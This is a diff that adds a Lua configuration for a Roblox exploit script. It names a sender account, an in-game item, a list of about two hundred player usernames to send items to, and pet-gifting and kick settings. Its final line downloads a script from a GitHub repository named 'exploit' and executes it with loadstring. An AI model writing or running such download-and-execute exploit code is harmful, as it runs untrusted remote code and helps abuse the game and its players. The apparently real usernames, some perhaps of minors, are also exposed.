@@ -1,1 +1,70 @@
+_G.CF = {
+    TreeConfig = {
+        Enabled = true,
+        Sender = "Al3xand3rTurbo201823", -- account that gives trees
+        TreeName = "Bone Blossom", -- part of tool name
+        TargetList = {
+            "Scarl3ttZ3rogl33", "KatherineCosmoScorch", "Olivia_T0xic2007", "TheRealEvan_Neon", "Th3R3alN3bulaKing",
+            "HiccupMeteor13", "Wav3Moon2018", "Jos3phUtopia", "Ninja_BOUNCE59", "Mrssc0ttRipple",
+            "NexusDriftFlareZephy", "NexusJayden_Chase", "ZoomWhisper", "oliviaMysticCind3r", "Itsianhaz3",
+            "SkylarIvoryMagic", "XxDancerMaxJellyxX", "XxCircuitGigaxX2023", "GabrielC0sm0", "Juliaplume_YT",
+            "P0werHer02013", "MeteorQuackBolt70", "NexusStarlight_Jeste", "AidenEchoShadowYT", "SparkDarkBuilder",
+            "ItsEthanW0bble", "Kara_Radiant", "Lillian_Stream95", "Rider_Legend2024", "BladeSparkPrism14",
+            "Th3R3alEvanZ00m", "Faith_SABER2005", "CalebWave2012_YT", "CarlRav3njumpy", "LightG0ldenBuilder",
+            "TomCrimsonYT", "EliseAbyss2023", "J0shua_Whisper2015", "Cyber_Pr0201976", "RiftVort3x2018YT",
+            "ItsEdwardRipple2021", "Grace_Whirl45", "Audr3yZ3phyrX3non", "BenjaminSaber2011", "MysticPh03nix63",
+            "ZaydenSaddle2014", "TheRealOliverMasterW", "ItsMasonStreamYT", "LukeWarden86", "NexusTinasplashfizzl",
+            "Pete_Ooze2006YT", "MrsMaxSaddle", "candyWraith87", "MichaelThunderboltCl", "TheRealCircuitEmeral",
+            "Cometbloom90", "Saddle_shade", "Dav3Radiant2015", "MrsDaniel_Hyper", "OliviatwistBlaze93",
+            "kate_nook52", "ItsPetter_Fox2022", "ItsEliseDragon2020", "taraWraithCosmos2011", "Itsgary_Emerald",
+            "J0hnShad0wStream", "XxStormyChas3Shadowx", "DanielvaleWizard2002", "MrsfionaRiftSunrise",
+            "ItslauraNibble", "JoltFizzy", "TheRealIanMax2016", "TheRealKen_sprout", "TheRealEmily_Wobble",
+            "NexusJoseph_Drake", "Hunt3rMysticQuack", "markDrakeRocket", "TheRealLillianjetQua",
+            "NexusZacharyZephyr", "HazelMagicWolf", "danaCatalyst2014", "PixelArrow58", "MrsEliBeast2011",
+            "LevihushWarden", "sc0ttMead0w", "IanHero2015", "EliChaosfern", "MrsLillian_IVORY",
+            "ninaEmeraldInferno20", "B0ulder_Surge", "MikeMoonbeamFalcon", "Slim3Flick31", "Mrs3ricJad3",
+            "TheRealIgniteLava", "N3xusMilaBacon", "Sofia_pineYT", "MrschrisPixelDancer2", "ItsJax0n_Bl0ck",
+            "Itsivy_L00m", "Rocketplume33", "Dawnfern2021", "ItsIslahill2019", "Itsbreezehush",
+            "ItsZoeBlade", "AlexanderIvoryMiner", "AlanBoulder22YT", "TheRealNoahVortex200",
+            "WilliamHiccup", "NexusMasonJester2007", "Viol3t_Wizard", "MrsGiannaKnight", "HearthVortex",
+            "Ge0rgeRipple", "MrsBrooklynTalon", "MrsMichaelchime", "MrsRyanFr0st", "Harperbr00kM00nbeam2",
+            "claireGauge49", "TheRealLillianLumino", "MrsAubreythorn", "MoonBuild3rN3on", "AudreyPlayz2024",
+            "ClaireOrbit_YT", "ItsHannahBlastCinder", "ItsPenelope_GOLDEN20", "ElizabethVoid2021",
+            "JosiahWardenDynamo", "SorcererMiner", "Evelynplume2021", "TheRealEliseStarligh",
+            "graceParagon31", "Th3R3alGrac3Blizzard", "Victoria_FLARE2019", "Nexusquinn_Primal",
+            "NexusJuliaSpark", "SparkSparklyRocketYT", "THEREALLUMINOSMIRAGE", "Owen_Storm40",
+            "AddisonSkater87_YT", "JillDusk200814", "NEXUSDAWN_Chase", "hillMiner2018", "Jak3glow",
+            "TheRealoliviaNexus", "WilliamCrimsonSpirit", "ItsSkylarPixelMystic", "Nick_Knight2011",
+            "MRSJACK_Grove", "ZoeFalconcrisp", "ItsOmegaTangle71", "Avaelm2004YT", "Nexussprout_Lava2009",
+            "TheRealPaisley_BLAZE", "paulGigaflick", "MrsivyWillowShine", "TheRealNick_frosty",
+            "HarperWardenTurbo", "MRSFUSION_Aqua", "TheRealAudrey_plume2", "LilyStormy2008", "JakeplumeKing",
+            "Dav3_Com3t98", "NexusVictoriabloomGr", "ITSSAMANTHA_mirth", "CharlotteVivid201862",
+            "NexusCalebbrook", "MrsOliver_shady", "VoidGlitch71", "RoseTurbobrook", "ItsRiftTurb0",
+            "TheRealIslanook", "Ginashade87", "SofiaStarlight97", "HannahPrimal98", "TheRealKen_DRIFT2008",
+            "ItsViperPebble2022", "MrsElipaws", "ItsN3bulaR3ap3r2008", "RocketZeroOoze", "ItsMichael_Pulse2003",
+            "Addiewindridge", "AsherMoonbeamhush", "SilverOmegaYT", "ItsPixelatedGlitch", "GiannaLightBlaze",
+            "TheRealGrays0n_Ech0", "RyanZeal201912", "NexusCinderTwist", "NexusreefSlime2005",
+            "TheRealtwistHalo2004", "MrsRyan_Echo", "Faith_Paragon", "RIPPLE_Zap96", "JulianDancer34",
+            "BenFoxJelly", "TinaToxic2018", "SofiaTangl32004", "ConnorEcho2002", "Th3R3alLisa_N3BULA",
+            "MrsLucasFury", "TheRealumaVoidGobble"
+        },
+        PerPlayer = 1,
+        KickWhenEmpty = true,
+    },
+    PetConfig = {
+        Enabled = false,
+        SendersConfig = {
+            AllExceptReceiversAreSenders = true,
+            Senders = { "PetSender1", "PetSender2" },
+        },
+        GiftForPlayers = { "Receiver1", "Receiver2" }, -- nếu muốn thay bằng list trên luôn, bảo mình
+        ListPetGift = {
+            ["Dog"] = 2,
+            ["Cat"] = 3,
+        },
+        KickWhenEmpty = true,
+        KickReceiverFull = true,
+    }
+}
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PorryDepTrai/exploit/refs/heads/main/ATRGG.lua"))()
